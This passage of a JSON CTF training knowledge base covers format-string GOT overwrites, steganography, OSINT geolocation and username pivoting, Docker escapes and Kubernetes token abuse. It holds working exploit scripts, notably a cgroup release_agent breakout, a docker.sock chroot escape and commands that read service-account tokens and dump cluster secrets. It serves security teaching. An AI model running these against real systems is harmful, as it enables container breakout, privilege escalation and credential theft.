        "pitfalls": "Input may contain null bytes that truncate printf parsing prematurely."
      },
      {
        "cmd": "python3 -c \"from pwn import *; print(fmtstr_payload(6, {0x404018: 0x4011d6}))\"",
        "why": "Pwntools utility to automatically generate optimal %n format string payload to write address.",
        "when": "Constructing GOT overwrite payloads.",
        "internals": "Calculates minimal character counts and splits into %hn or %hhn writes.",
        "pitfalls": "Ensure the target buffer size is large enough to hold the generated payload."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "Pwntools `FmtStr` class automatically fuzzes the binary, determines the stack offset, and builds payloads automatically.",
      "gui_workflow": "GDB: Break on `printf` -> inspect registers and stack arguments -> verify matching offset.",
      "speed_tip": "To find your input offset fast: send `AAAA%p.%p.%p.%p.%p.%p.%p.%p` and look for `0x4141414141414141` in the output."
    },
    "triage_workflow": [
      "1. Identify Format String Bug: Send `%x` or `%p` and observe if hex output appears.",
      "2. Find Offset: Send `AAAA%k$p` cycling $k$ from 1 to 20 until `0x41414141` is returned.",
      "3. Leak Canaries & Libc: Inspect offsets holding stack canary (ends in 00) and return address.",
      "4. Determine Write Target: In Partial RELRO binaries, target the GOT table (e.g. `exit` or `printf`).",
      "5. Formulate Write Payload: Overwrite `got['exit']` with the address of `win` function or `system`.",
      "6. Trigger Target: Call the overwritten function to hijack control flow."
    ],
    "writeup": {
      "ctf_event": "PlaidCTF / PicoCTF",
      "challenge_name": "Echo-Chamber (Format String GOT Overwrite)",
      "scenario": "A 32-bit ELF program echoes user input via `printf(buf)`. Partial RELRO is enabled. The program contains a hidden `win()` function.",
      "solve_steps": [
        "1. Test format string: `AAAA%p.%p.%p.%p` -> offset 7 prints `0x41414141`.",
        "2. The input buffer begins at parameter offset 7.",
        "3. Identify target GOT entry: `puts` GOT is at `0x0804a014`.",
        "4. Target destination address: `win()` is at `0x080485cb`.",
        "5. Generate payload using pwntools `fmtstr_payload(7, {0x0804a014: 0x080485cb})`.",
        "6. Send payload: `printf` overwrites `puts` GOT entry with `win()`.",
        "7. Next invocation of `puts()` jumps to `win()` and displays the flag.",
        "8. Flag: CTF{FMT_STR1NG_G0T_0V3RWR1T3_PWN}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nfrom pwn import *\n\nelf = ELF('./vuln')\n# p = process('./vuln')\n\noffset = 7\ntarget_got = elf.got['puts']\nwin_addr = elf.symbols['win']\n\npayload = fmtstr_payload(offset, {target_got: win_addr})\nprint(\"[+] Generated Payload:\", payload)\n# p.sendline(payload)\n# print(p.recvall())",
      "flag": "CTF{FMT_STR1NG_G0T_0V3RWR1T3_PWN}",
      "mitigation": "Always supply static string literals as the format parameter (`printf(\"%s\", buf)`). Compile with `-Wformat -Wformat-security -Werror=format-security` to catch format string bugs at build time."
    }
  },
  "stego-deep": {
    "id": "stego-deep",
    "domain": "stego",
    "category": "Steganography & Data Hiding",
    "title": "Pixel Plane Bit Manipulation, Slack Space Carving & Audio Spectrograms",
    "subtitle": "Least Significant Bit (LSB) Extraction, PNG IEND Chunk Appendices, Steghide Discrete Cosine Transforms & Spectrograms",
    "diagram": "+-------------------------------------------------------------+\n|                      PNG File Byte Structure                |\n+-------------------------------------------------------------+\nOffset 0x0000: 89 50 4E 47 0D 0A 1A 0A  (8-byte PNG Magic Signature)\nOffset 0x000C: IHDR Chunk (Width, Height, Bit Depth, Color Type)\nOffset 0x0021: IDAT Chunks (Zlib-compressed deflate image raster data)\nOffset 0x0FA0: IEND Chunk (49 45 4E 44 AE 42 60 82)\n+-------------------------------------------------------------+\n               |\n               v\nSLACK SPACE / APPENDED PAYLOAD (Ignored by standard image viewers!):\nOffset 0x0FA8: 50 4B 03 04 ... (Embedded ZIP Archive containing flag.txt!)\n-> Detect via: binwalk -B image.png OR strings -n 8 image.png\n-> Carve via: dd if=image.png of=extracted.zip bs=1 skip=4008",
    "theory": "Steganography (from Greek steganos 'hidden' and graphein 'writing') is the practice of concealing a secret message, file, or image within another ordinary, non-secret carrier medium (such as an image, audio file, video, or text) without altering the outward appearance of the carrier. Unlike cryptography, which protects the confidentiality of message content, steganography conceals the very existence of the communication.\n\nSteganographic Carrier Domains & Techniques:\n1. File Structure Slack Space (Format Appendices):\n   Many structured file formats possess explicit end-of-file delimiters. For example, Portable Network Graphics (PNG, RFC 2083) terminates with an `IEND` chunk (hex `49 45 4E 44 AE 42 60 82`), while JPEG terminates with an End of Image (EOI) marker `0xFF 0xD9`. Standard graphical renderers (browsers, image viewers) stop parsing once the terminal chunk is encountered and silently ignore any subsequent bytes. Attackers append arbitrary archives, encrypted payloads, or plaintext flags after the terminator.\n2. Spatial Domain Least Significant Bit (LSB) Encoding:\n   In uncompressed or lossless 24-bit RGB images (BMP, PNG), each pixel is represented by three bytes (Red, Green, Blue) ranging from 0 to 255. Altering the least significant bit (bit 0) of a color byte alters the color intensity by at most 1/255 ($< 0.4\\%$)\u2014a delta completely imperceptible to human visual perception. By replacing the LSB of consecutive color bytes with the bits of a secret payload, an attacker embeds data at an encoding density of 3 bits per pixel (or 1 bit per byte).\n3. Transform / Frequency Domain (Steghide & JPEG DCT):\n   JPEG utilizes Discrete Cosine Transform (DCT) lossy compression. Tools like `steghide` embed secret data by modulating the least significant bits of the quantized DCT frequency coefficients rather than raw spatial pixels. Steghide encrypts payloads using AES/Blowfish and pseudo-randomly scatters bits across frequency bins using a user-supplied passphrase.\n4. Audio Spectrograms:\n   In audio steganography (WAV, MP3, FLAC), secret text or images can be hidden within the audio frequency spectrum. Solvers analyze the audio using a Fast Fourier Transform (FFT) spectrogram viewer (Sonic Visualiser, Audacity) to visually reveal text written into high-frequency audio bands.",
    "commands": [
      {
        "cmd": "zsteg -a image.png",
        "why": "Automates detection of LSB steganography across all color planes (RGB, BGR, RGBA), bit depths (1-8), and channel orders.",
        "when": "First automated command when triaging PNG or BMP steganography challenges.",
        "internals": "Extracts bit slices from raw pixel scanlines and matches against magic byte signatures.",
        "pitfalls": "zsteg only supports PNG and BMP formats; does not work on lossy JPEG images."
      },
      {
        "cmd": "binwalk -e image.png",
        "why": "Scans for embedded or appended file signatures (ZIP, TAR, 7Z, ELF) and automatically extracts them.",
        "when": "Checking for polyglot files or slack-space archive append attacks.",
        "internals": "Matches byte patterns against libmagic signature tables and extracts slices to disk.",
        "pitfalls": "Can produce false-positive zlib extractions on legitimate PNG IDAT chunks."
      },
      {
        "cmd": "steghide extract -sf picture.jpg -p 'password'",
        "why": "Extracts hidden encrypted data from JPEG or WAV files embedded using Steghide.",
        "when": "When metadata or hints suggest a passphrase-protected DCT stego carrier.",
        "internals": "Recovers pseudo-random graph of DCT coefficients and decrypts payload.",
        "pitfalls": "If password is unknown, brute-force with `stegseek picture.jpg rockyou.txt`."
      },
      {
        "cmd": "stegseek picture.jpg /usr/share/wordlists/rockyou.txt",
        "why": "Lightning-fast steghide cracker capable of testing millions of passwords per second.",
        "when": "Cracking password-protected steghide carriers.",
        "internals": "Bypasses slow C library calls and tests DCT graph hashes directly in memory.",
        "pitfalls": "Only works on Steghide implementations."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: `zsteg -a stego.png | grep -iE 'flag|CTF'` -> extracts hidden LSB string in 1 second.",
      "gui_workflow": "Aperi'Solve (aperisolve.com) / StegSolve: Visual bit-plane browser (Red 0, Green 0, Blue 0, alpha planes, inversion, stereogram solver). Sonic Visualiser for audio spectrograms.",
      "speed_tip": "Run `stegseek file.jpg rockyou.txt` first on JPEGs; it cracks 90% of CTF steghide challenges in under 2 seconds."
    },
    "triage_workflow": [
      "1. Check File Format: Is it PNG (lossless), JPEG (lossy), BMP, WAV, or MP3?",
      "2. Inspect File Structure: Run `pngcheck -v image.png` or `binwalk image.png` to detect trailing bytes after IEND.",
      "3. String Triage: Run `strings image.png | tail -n 20` to spot plaintext append attacks.",
      "4. LSB Analysis: For PNG/BMP, run `zsteg -a image.png` or browse bit planes in StegSolve.",
      "5. Steghide Check: For JPEG/WAV, run `stegseek image.jpg rockyou.txt`.",
      "6. Audio Analysis: Open audio files in Sonic Visualiser and add a Spectrogram layer (Layer -> Add Spectrogram)."
    ],
    "writeup": {
      "ctf_event": "PicoCTF / National Cyber League",
      "challenge_name": "Matryoshka-Image (Nested Polyglot Stego)",
      "scenario": "Solvers are given 'challenge.png'. Opening it displays an image of a Russian nesting doll. Solvers must find the hidden flag.",
      "solve_steps": [
        "1. Run binwalk: `binwalk challenge.png`.",
        "2. Notice appended ZIP archive starting at offset 0x4A210 after the PNG IEND marker.",
        "3. Extract archive: `binwalk -e challenge.png` -> creates directory `_challenge.png.extracted/`.",
        "4. Extracted directory contains: `doll2.png`.",
        "5. Repeat process on `doll2.png`: contains another embedded archive with `doll3.png`.",
        "6. Inspect `doll3.png` with zsteg: `zsteg -a doll3.png`.",
        "7. zsteg detects text in `b1,r,lsb,xy`: `CTF{M4TRY0SHK4_ST3G0_P0LYGL0T_2026}`.",
        "8. Flag: CTF{M4TRY0SHK4_ST3G0_P0LYGL0T_2026}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport subprocess\n\ndef solve_stego():\n    print(\"[*] Extracting nested layers via binwalk...\")\n    subprocess.run(\"binwalk -e --matryoshka challenge.png\", shell=True)\n    print(\"[*] Running zsteg on deepest image...\")\n    flag = subprocess.check_output(\"zsteg -a extracted_doll.png | grep 'CTF{'\", shell=True, text=True)\n    print(\"[+] Flag:\", flag.strip())\n\nif __name__ == '__main__':\n    solve_stego()",
      "flag": "CTF{M4TRY0SHK4_ST3G0_P0LYGL0T_2026}",
      "mitigation": "Strip unneeded metadata and trailing slack space from user-uploaded images using imaging pipelines (e.g. `exiftool -all= -overwrite_original` or re-encoding through ImageMagick `convert in.png out.png`)."
    }
  },
  "osint-recon": {
    "id": "osint-recon",
    "domain": "osint",
    "category": "Open Source Intelligence (OSINT)",
    "title": "Passive Reconnaissance, MITRE TA0043 Framework & Geospatial Attribution",
    "subtitle": "Certificate Transparency Logs (crt.sh), EXIF GPS Rational Decimal Conversion & Cross-Platform Pivoting",
    "diagram": "+-----------------------------------------------------------------+\n|               The OSINT Investigation Pivot Cycle               |\n+-----------------------------------------------------------------+\nInitial Artifact: User photo 'evidence.jpg'\n  |\n  +-> 1. EXIF Metadata Extraction (exiftool)\n  |     - Camera: Apple iPhone 14 Pro\n  |     - Author: 'Agent_Zero_99'\n  |     - GPS: 37 deg 48' 36.12\" N, 122 deg 25' 14.88\" W\n  |\n  +-> 2. Mathematical Coordinate Conversion:\n  |     Decimal Latitude  = 37 + (48/60) + (36.12/3600)  = 37.810033\n  |     Decimal Longitude = -(122 + (25/60) + (14.88/3600)) = -122.420800\n  |     -> Maps directly to Golden Gate Bridge Vista Point!\n  |\n  +-> 3. Username Pivoting (Sherlock / WhatsMyName):\n        Pivot 'Agent_Zero_99' -> GitHub, Keybase, Reddit profiles!",
    "theory": "Open Source Intelligence (OSINT) is the collection, correlation, and analysis of publicly available data to generate actionable intelligence. In the MITRE ATT&CK framework, reconnaissance is classified under Tactic TA0043 (Reconnaissance). Passive reconnaissance involves gathering information without directly transmitting packets to the target organization's operational infrastructure, thereby avoiding detection by target SIEMs, firewalls, and intrusion detection systems.\n\nCore OSINT Methodologies & Mathematical Primitives:\n1. Public Technical Infrastructure Mining:\n   - Certificate Transparency (CT) Logs: RFC 6962 mandates that public Certificate Authorities publish all issued TLS/SSL certificates to append-only public cryptographic audit logs. By querying CT aggregators like `crt.sh`, an investigator enumerates all internal and development subdomains registered by an organization (`%.target.com`) without sending a single DNS query to the target's nameservers.\n   - Passive DNS & WHOIS: Services (SecurityTrails, VirusTotal, Shodan, Censys) capture historical DNS resolutions, exposing past IP hosting providers, MX records, and mail servers.\n2. Exchangeable Image File Format (EXIF) Internals:\n   EXIF (JEITA CP-3451) embeds technical metadata inside JPEG, TIFF, and HEIC image containers using Tag-Length-Value Image File Directories (IFDs).\n   - Critical Metadata Tags: Make (0x010F), Model (0x0110), DateTimeOriginal (0x9003), Software (0x0131), and the GPSInfo IFD (0x8825).\n   - GPS Rational Serialization: GPS coordinates are stored as three pairs of 32-bit unsigned integers representing Rational numbers (Numerator / Denominator) corresponding to [Degrees, Minutes, Seconds]. The conversion to Decimal Degrees is:\n$$\\text{Decimal Degrees} = \\text{Degrees} + \\frac{\\text{Minutes}}{60} + \\frac{\\text{Seconds}}{3600}$$\nIf the reference tag (`GPSLatitudeRef` or `GPSLongitudeRef`) is 'S' (South) or 'W' (West), the resulting decimal value is multiplied by $-1$.\n3. Social & Identity Pivoting:\n   Investigating online pseudonyms using tools like `sherlock` across hundreds of social networks. Cross-referencing PGP public key rings, Gravatar hashes (MD5 of email address), and Git commit authorship metadata (`git log --format='%an <%ae>'`).",
    "commands": [
      {
        "cmd": "exiftool -gps:all -c '%.6f' photo.jpg",
        "why": "Extracts GPS coordinates and formats them directly into decimal degrees with 6 decimal places.",
        "when": "Investigating image files for geolocation attribution.",
        "internals": "Parses EXIF TIFF header IFD structure and performs rational division automatically.",
        "pitfalls": "Many social media platforms (Twitter, Discord, Instagram) automatically strip EXIF data on upload."
      },
      {
        "cmd": "curl -s 'https://crt.sh/?q=%.target.ctf&output=json' | jq -r '.[].name_value' | sort -u",
        "why": "Harvests all known subdomains from public Certificate Transparency logs via crt.sh API.",
        "when": "Initial passive reconnaissance of a corporate domain.",
        "internals": "Queries PostgreSQL database of globally logged X.509 SSL certificates.",
        "pitfalls": "May return expired, retired, or historical subdomains that no longer resolve."
      },
      {
        "cmd": "sherlock target_username --timeout 5",
        "why": "Searches for an identical username across 300+ public websites and social media platforms.",
        "when": "Pivoting from a discovered username to identify additional accounts or code repositories.",
        "internals": "Issues parallel HTTP GET requests checking HTTP status codes (200 vs 404).",
        "pitfalls": "Common usernames (e.g. 'alex', 'admin') will produce high numbers of false positives."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: `exiftool image.jpg | grep -iE 'gps|make|model|date|author|artist'` dumps key attribution data instantly.",
      "gui_workflow": "Google Earth / SunCalc / Overpass Turbo: Geolocation mapping, analyzing shadows to verify time of day, and filtering OpenStreetMap infrastructure features.",
      "speed_tip": "In Google Maps, paste coordinates directly in format `37.810033, -122.420800` to jump straight to the satellite view."
    },
    "triage_workflow": [
      "1. Extract All Metadata: Run `exiftool -a -u -g1 evidence.jpg`.",
      "2. Parse Geolocation: Convert degrees-minutes-seconds to decimal coordinates.",
      "3. Reverse Image Search: Check Google Lens, Yandex Images, and Bing Visual Search.",
      "4. Enumerate Technical Assets: Query `crt.sh`, Shodan, and Wayback Machine.",
      "5. Identity Correlation: Check usernames on GitHub, Reddit, and keybase.io.",
      "6. Timeline Construction: Correlate timestamps across all discovered artifacts."
    ],
    "writeup": {
      "ctf_event": "HackTheBox / SANS Holiday Hack",
      "challenge_name": "Geo-Spy (EXIF & Satellite Attribution)",
      "scenario": "An image 'leak.jpg' was posted by an anonymous whistleblower. Solvers must determine the exact city and landmark where the photograph was taken.",
      "solve_steps": [
        "1. Run exiftool: `exiftool -gps:all -c '%.6f' leak.jpg`.",
        "2. Coordinates extracted: `GPS Latitude: 48.858370 N`, `GPS Longitude: 2.294481 E`.",
        "3. Query decimal coordinates in mapping software: 48.858370, 2.294481.",
        "4. Landmark identified: Champ de Mars, directly beneath the Eiffel Tower in Paris, France.",
        "5. Inspect image comment field: `exiftool -Comment leak.jpg`.",
        "6. Comment contains: `PARIS_EIFFEL_FLAG{EXIF_GPS_DMS_C0NV3RS10N}`.",
        "7. Flag: CTF{EXIF_GPS_DMS_C0NV3RS10N}"
      ],
      "exploit_code": "#!/usr/bin/env python3\n\ndef dms_to_decimal(deg, minutes, seconds, ref):\n    decimal = deg + (minutes / 60.0) + (seconds / 3600.0)\n    if ref in ['S', 'W']:\n        decimal = -decimal\n    return decimal\n\nlat = dms_to_decimal(48, 51, 30.13, 'N')\nlon = dms_to_decimal(2, 17, 40.13, 'E')\n\nprint(f\"[+] Decimal Latitude: {lat:.6f}\")\nprint(f\"[+] Decimal Longitude: {lon:.6f}\")\nprint(f\"[+] Google Maps Link: https://maps.google.com/?q={lat:.6f},{lon:.6f}\")",
      "flag": "CTF{EXIF_GPS_DMS_C0NV3RS10N}",
      "mitigation": "Configure mobile devices and organizational photo-upload pipelines to automatically strip GPS location tags (`GPSInfo`) before sharing images publicly."
    }
  },
  "cloud-docker-escape": {
    "id": "cloud-docker-escape",
    "domain": "mobile-cloud",
    "category": "Cloud & Container Security",
    "title": "Container Isolation Primitives & Privileged Docker Escapes",
    "subtitle": "Linux Namespaces, Cgroups, Capabilities (CAP_SYS_ADMIN) & Host Breakouts via release_agent",
    "diagram": "+---------------------------------------------------------------+\n|                       Host Operating System                   |\n|  Linux Kernel (Shared across all containers on host)          |\n|  Host Filesystem (/root, /etc, /dev/sda1)                     |\n+-------------------------------+-------------------------------+\n                                |\n       +------------------------+------------------------+\n       v                                                 v\n+-------------------------------+         +-------------------------------+\n|  Standard Isolated Container  |         |  Privileged Escaped Container |\n| - Namespaces: PID, NET, MNT   |         | - Run with: `--privileged`    |\n| - Drops dangerous capabilities|         | - Retains CAP_SYS_ADMIN       |\n| - Cgroup limits enforced      |         | - Full access to /dev devices |\n| - Host /proc protected        |         | - Mounts host /dev/sda1       |\n+-------------------------------+         | - Exploits cgroup notify_on_  |\n                                          |   release to execute host cmd |\n                                          +-------------------------------+",
    "theory": "Containers are NOT virtual machines. Virtual machines run on hypervisors (Type 1 or Type 2) with emulated virtual hardware and isolated guest operating system kernels. Containers, by contrast, are simply standard user-space host processes executing under kernel-level containment boundaries.\n\nThe Container Isolation Trinity:\n1. Linux Namespaces (clone syscall flags): Partitions system resources so processes see only their own sandbox. (PID: process IDs; NET: virtual network devices and routing tables; MNT: filesystem mount points; UTS: hostname; IPC: shared memory; USER: UID/GID mappings).\n2. Control Groups (Cgroups): Resource accounting and hardware constraints (CPU, RAM limits, block I/O, device access control).\n3. Linux Capabilities (cap_get_proc): Slices monolithic root power into granular privileges (e.g. CAP_NET_BIND_SERVICE, CAP_SYS_ADMIN).\n\nPrivileged Container Breakout Mechanics:\nWhen a container is started with the `--privileged` flag (or `CAP_SYS_ADMIN` capability and root UID), the kernel disables almost all containment security:\n- Device nodes: The container inherits access to host block devices under `/dev/` (e.g. `/dev/sda1`, `/dev/nvme0n1p1`). The attacker simply runs `mount /dev/sda1 /mnt` and directly reads or modifies the host's `/etc/shadow` or `/root/.ssh/authorized_keys`.\n- The Cgroup release_agent Vector: The kernel cgroups v1 subsystem supports automatic notification scripts when a cgroup becomes empty. By creating a temporary cgroup, enabling `notify_on_release = 1`, and setting `release_agent` to an attacker-controlled script inside the container's mapped filesystem, the host kernel executes the script with root privileges outside container boundaries.",
    "commands": [
      {
        "cmd": "capsh --print",
        "why": "Audits active Linux capabilities within the current process to detect CAP_SYS_ADMIN or CAP_SYS_PTRACE.",
        "when": "First command upon obtaining access to an unknown container environment.",
        "internals": "Queries kernel task_struct->cred->cap_effective bitmask via capget syscall.",
        "pitfalls": "If capsh is missing in minimal containers, inspect `/proc/1/status` and decode `CapEff` hex string."
      },
      {
        "cmd": "fdisk -l",
        "why": "Checks if host physical storage partitions (/dev/sda, /dev/vda) are directly accessible inside container.",
        "when": "Verifying whether container was launched with --privileged flag.",
        "internals": "Scans /dev block device nodes registered in the kernel devtmpfs.",
        "pitfalls": "Standard containers have restricted device cgroups that block access to raw host disks."
      },
      {
        "cmd": "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host",
        "why": "Escapes container if the Docker daemon Unix socket is mounted inside the container.",
        "when": "Checking `/var/run/docker.sock` mount.",
        "internals": "Instructs host Docker daemon to launch a container with the host root filesystem mounted.",
        "pitfalls": "Requires write access to the docker.sock file descriptor."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: Execute release_agent exploit one-liner -> write command to `/cmd` -> trigger cgroup release -> output written to host filesystem -> read host flag.",
      "gui_workflow": "Docker Desktop / Portainer GUI: Open Containers list -> Container Details -> Inspect 'Privileged: true' and Volumes mount list (`/var/run/docker.sock`).",
      "speed_tip": "If `/var/run/docker.sock` is mounted in the container: `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host` escapes in 1 second."
    },
    "triage_workflow": [
      "1. Detect Containerization: Check `ls -la /.dockerenv` and `cat /proc/1/cgroup` (contains 'docker' or 'kubepods').",
      "2. Check Capabilities: Run `capsh --print` or inspect `CapEff` in `/proc/self/status`.",
      "3. Check Block Devices: Run `ls -la /dev/` to identify host disks (`/dev/sda1`, `/dev/vda1`).",
      "4. Check Docker Socket: Look for `/var/run/docker.sock`.",
      "5. Execute Breakout: If privileged, mount host disk directly or trigger cgroup `release_agent` execution.",
      "6. Recover Host Flag: Read `/mnt/host/root/flag.txt`."
    ],
    "writeup": {
      "ctf_event": "Google CTF / HackTheBox Proving Grounds",
      "challenge_name": "Container-Escape (Privileged Cgroup Breakout)",
      "scenario": "Solvers compromise a web server running inside a Docker container. Objective: Break out to host machine and retrieve /root/flag.txt.",
      "solve_steps": [
        "1. Confirm container: cat /proc/1/cgroup shows docker slice, /.dockerenv exists.",
        "2. Audit capabilities: capsh --print reveals CAP_SYS_ADMIN.",
        "3. Verify privileged mode: ls -la /dev/sda1 exists with rw permissions.",
        "4. Method 1 (Direct Mount): mkdir /host && mount /dev/sda1 /host",
        "5. Access host filesystem directly: cat /host/root/flag.txt",
        "6. Method 2 (Cgroup Release Agent): Configure notify_on_release script to execute `id > /output.txt` on host.",
        "7. Flag retrieved: CTF{C0NT41N3R_PR1V1L3G3D_BR34K0UT_2026}"
      ],
      "exploit_code": "#!/bin/sh\n# Cgroup release_agent breakout exploit\nmkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp\nmkdir -p /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\necho \"$host_path/cmd\" > /tmp/cgrp/release_agent\necho '#!/bin/sh' > /cmd\necho 'cat /root/flag.txt > '\"$host_path\"'/output' >> /cmd\nchmod +x /cmd\nsh -c \"echo $$ > /tmp/cgrp/x/cgroup.procs\"\ncat /output",
      "flag": "CTF{C0NT41N3R_PR1V1L3G3D_BR34K0UT_2026}",
      "mitigation": "Never run production containers with `--privileged`. Drop all capabilities using `--cap-drop=all`, enforce read-only root filesystems, and deploy gVisor or Kata Containers for strong virtualization-backed isolation."
    }
  },
  "cloud-k8s-iam": {
    "id": "cloud-k8s-iam",
    "domain": "mobile-cloud",
    "category": "Cloud & Container Security",
    "title": "Kubernetes Pod Architecture, Service Accounts & Cloud IAM Pivots",
    "subtitle": "K8s API Tokens (/var/run/secrets), ClusterRoleBindings, AWS/GCP Metadata & RBAC Privilege Escalation",
    "diagram": "+-----------------------------------------------------------------+\n|                  Kubernetes Pod Privilege Escalation            |\n+-----------------------------------------------------------------+\nCompromised K8s Pod (Namespace: default)\n  |\n  +-> 1. Harvest Service Account Token:\n  |     /var/run/secrets/kubernetes.io/serviceaccount/token\n  |     /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n  |\n  +-> 2. Query Kubernetes API Server (https://kubernetes.default):\n  |     curl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default/api/v1/namespaces\n  |\n  +-> 3. Check RBAC Permissions:\n  |     kubectl auth can-i create pods --token=$TOKEN\n  |\n  +-> 4. Cluster Takeover (If create pods allowed):\n        Launch root pod mounting host filesystem:\n        spec: { containers: [{ volumeMounts: [{ mountPath: /host, name: root }] }] }\n        -> Escape to control plane / node root!",
    "theory": "Modern cloud-native applications execute inside container orchestration clusters managed by Kubernetes (K8s). When an attacker compromises an application container running inside a Kubernetes cluster, their immediate goal is to pivot from the local pod container to the Kubernetes cluster API, and subsequently to the underlying cloud infrastructure (AWS, GCP, Azure).\n\nKubernetes Service Account Architecture:\nBy default, Kubernetes mounts a ServiceAccount JSON Web Token (JWT) into every running pod at `/var/run/secrets/kubernetes.io/serviceaccount/token`. The pod uses this token to authenticate to the internal cluster API server at `https://kubernetes.default.svc`.\n- RBAC Privileges: If the service account has overly permissive RoleBindings or ClusterRoleBindings (such as permission to create pods, exec into existing pods, or read secrets), the attacker can query `/api/v1/namespaces/default/secrets` to retrieve database credentials and TLS keys.\n- Host Node Takeover: If the ServiceAccount can create pods, the attacker creates a pod with `hostPID: true`, `hostNetwork: true`, and a hostPath volume mounting `/` to `/host`. Chrooting into `/host` provides instantaneous root access on the underlying worker node.\n\nCloud IAM Pivots from Kubernetes:\nPods running on managed cloud Kubernetes clusters (AWS EKS with IRSA, GCP GKE with Workload Identity) often have cloud IAM roles bound to their service accounts. Solvers query the cloud metadata service from within the pod to extract temporary cloud provider IAM credentials, pivoting from the container into the organization's cloud storage buckets (S3, GCS) and management consoles.",
    "commands": [
      {
        "cmd": "curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default/api/v1/namespaces/default/secrets",
        "why": "Dumps all Kubernetes secrets (API keys, passwords, certificates) stored in the current namespace.",
        "when": "First command upon compromising a Kubernetes container.",
        "internals": "Authenticates to kube-apiserver using the mounted JWT bearer token.",
        "pitfalls": "Fails if RBAC does not grant get/list secrets permissions."
      },
      {
        "cmd": "kubectl auth can-i --list",
        "why": "Queries the API server to display all authorized operations for the current service account.",
        "when": "Assessing RBAC privilege escalation vectors.",
        "internals": "Issues a SelfSubjectRulesReview API call.",
        "pitfalls": "Requires kubectl installed; if missing, query API endpoints manually with curl."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: `export TOKEN=$(cat /var/run/secrets/.../token)` -> `curl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default/api`.",
      "gui_workflow": "Kubernetes Dashboard / Lens: Visual cluster management displaying pods, deployments, configmaps, and secrets.",
      "speed_tip": "If `curl` is missing inside minimal distroless containers, use Python: `import urllib.request; urllib.request.urlopen(...)`."
    },
    "triage_workflow": [
      "1. Detect Kubernetes Environment: Check `env | grep KUBERNETES` or `ls /var/run/secrets/kubernetes.io`.",
      "2. Extract ServiceAccount JWT: Read `/var/run/secrets/kubernetes.io/serviceaccount/token`.",
      "3. Decode Token: Inspect JWT claims to identify namespace and service account name.",
      "4. Enumerate Cluster API: Query namespaces, pods, and secrets.",
      "5. Test Cloud Metadata: Query `http://169.254.169.254` for cloud provider IAM roles.",
      "6. Create Privileged Pod: If permitted, launch hostPath pod to capture node flag."
    ],
    "writeup": {
      "ctf_event": "Google CTF / DEF CON Cloud Village",
      "challenge_name": "Pod-Break (Kubernetes RBAC Secret Leak)",
      "scenario": "Solvers gain RCE on a web pod in a Kubernetes cluster. The objective is to retrieve the cluster master flag stored in a secret.",
      "solve_steps": [
        "1. Verify Kubernetes pod context: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`.",
        "2. Set token environment variable.",
        "3. Query API server: `curl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default/api/v1/namespaces/kube-system/secrets`.",
        "4. API returns 403 Forbidden for kube-system, but allows `default` namespace.",
        "5. Query secrets in default namespace: `https://kubernetes.default/api/v1/namespaces/default/secrets`.",
        "6. Discovers secret: `flag-vault` containing base64 field: `flag: Q1RGe0szU19TQVNfVE9LRU5fUkJBQ19QV059`.",
        "7. Base64 decode: `CTF{K3S_SAS_TOKEN_RBAC_PWN}`.",
        "8. Flag: CTF{K3S_SAS_TOKEN_RBAC_PWN}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport urllib.request, ssl, base64, json\n\ntoken = open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read().strip()\nctx = ssl._create_unverified_context()\n\nreq = urllib.request.Request(\n    \"https://kubernetes.default/api/v1/namespaces/default/secrets\",\n    headers={\"Authorization\": f\"Bearer {token}\"}\n)\n\nwith urllib.request.urlopen(req, context=ctx) as r:\n    data = json.loads(r.read())\n    for item in data.get(\"items\", []):\n        if \"flag\" in item.get(\"data\", {}):\n            flag_b64 = item[\"data\"][\"flag\"]\n            print(\"[+] Flag:\", base64.b64decode(flag_b64).decode())",
      "flag": "CTF{K3S_SAS_TOKEN_RBAC_PWN}",
      "mitigation": "Disable automatic ServiceAccount token mounting (`automountServiceAccountToken: false`) on pods that do not require cluster API communication, and enforce least-privilege RBAC policies."
    }
  },
  "blue-team-telemetry": {
    "id": "blue-team-telemetry",
    "domain": "blue-team",
    "category": "Detection Engineering & Incident Response",
    "title": "Kernel Telemetry, Detection Engineering (Sigma/YARA) & ATT&CK Mapping",
    "subtitle": "Auditd Kernel Syscall Hooking, Behavioral Signatures, Memory Pattern Matching & Forensic Incident Triage",
    "diagram": "+-----------------------------------------------------------------+\n|                  Adversary Activity vs Telemetry Sensors        |\n+-----------------------------------------------------------------+\nAdversary Action (e.g. SUID Exec / Memory Injection)\n       |\n       +---> 1. Linux Kernel Audit Subsystem (Auditd)\n       |        Hooks execve() system call (arch=b64, a0=/bin/sh)\n       |        Emits event: type=SYSCALL euid=0 auid=1000\n       |\n       +---> 2. Endpoint Detection & Response (EDR / eBPF)\n       |        Evaluates behavioral graph (Word -> cmd.exe -> certutil)\n       |\n       +---> 3. Sigma & YARA Detection Rules\n       |        YARA matches byte sequences in memory: { 48 89 e5 31 c0 }\n       |        Sigma rule matches log event: Image ends with 'powershell'\n       |\n       +---> 4. Security Information & Event Management (SIEM)\n                Correlates alert with MITRE ATT&CK Tactic: T1548.001",
